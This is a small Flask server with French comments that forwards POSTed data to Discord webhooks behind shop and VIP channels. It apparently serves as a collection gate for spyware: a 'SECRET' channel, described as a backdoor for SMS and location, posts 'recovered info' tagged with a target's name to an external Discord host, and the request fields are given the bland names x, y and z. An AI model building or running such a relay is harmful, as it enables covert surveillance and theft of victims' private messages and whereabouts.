import os
import logging
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Configuration des logs pour voir les erreurs sur Render
logging.basicConfig(level=logging.INFO)

# Récupération des Webhooks sur Render
WEBHOOKS = {
    "BOUTIQUE": os.environ.get('WEBHOOK_BOUTIQUE'), # Salon Boutique
    "VIP": os.environ.get('WEBHOOK_VIP'),           # Salon Escanor VIP (Chat)
    "SECRET": os.environ.get('WEBHOOK_SECRET')      # Salon Porte Dérobée (SMS/Loc)
}

SECRET_KEY = os.environ.get('ESCANOR_KEY')

@app.route('/gate', methods=['POST'])
def gate():
    # Vérification de la clé de sécurité
    auth_key = request.headers.get('X-Escanor-Auth')
    if auth_key != SECRET_KEY:
        app.logger.warning(f"Tentative de connexion échouée avec la clé : {auth_key}")
        return "Auth Fail", 401

    try:
        data = request.get_json(force=True)
        user = data.get('x', 'Anonyme')
        msg_type = data.get('y', 'BOUTIQUE') # Type : BOUTIQUE, VIP, ou SECRET
        content = data.get('z', 'Pas de contenu')

        # Sélection du salon Discord
        url = WEBHOOKS.get(msg_type)
        
        if not url:
            return jsonify({"error": "Type de salon inconnu"}), 400

        # Formatage du message selon le type
        if msg_type == "SECRET":
            payload = {"content": f"🚨 **INFOS RÉCUPÉRÉES** 🚨\n👤 Cible : {user}\n📊 Données : {content}"}
        elif msg_type == "VIP":
            payload = {"content": f"💎 **MESSAGE VIP** 💎\n👤 Client : {user}\n💬 Requête : {content}"}
        else:
            payload = {"content": f"🛒 **COMMANDE BOUTIQUE** 🛒\n👤 Client : {user}\n📦 Article : {content}"}

        # Envoi vers Discord
        response = requests.post(url, json=payload)
        
        if response.status_code == 204 or response.status_code == 200:
            return jsonify({"status": "envoyé"}), 200
        else:
            return jsonify({"status": "erreur_discord", "code": response.status_code}), 500

    except Exception as e:
        app.logger.error(f"Erreur interne : {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
